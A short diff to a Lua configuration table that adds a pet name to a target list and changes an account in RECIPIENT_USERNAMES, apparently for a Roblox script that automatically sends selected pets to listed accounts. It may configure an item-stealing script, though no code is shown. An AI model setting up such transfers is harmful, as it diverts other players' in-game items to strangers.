@@ -10,12 +10,13 @@ return {
         ["dragonfly"]    = true,
         ["disco bee"]    = true,
         ["butterfly"]    = true,
+        ["bloos"]      =  true,
     },
     DELAY_BETWEEN_PETS = 0.125,
 
 
     RECIPIENT_USERNAMES = {
-    ["jandels_pet"] = true,
+    ["1xxxCoolGuyxx1"] = true,
     ["canyoust0pME"] = true,
 },
 
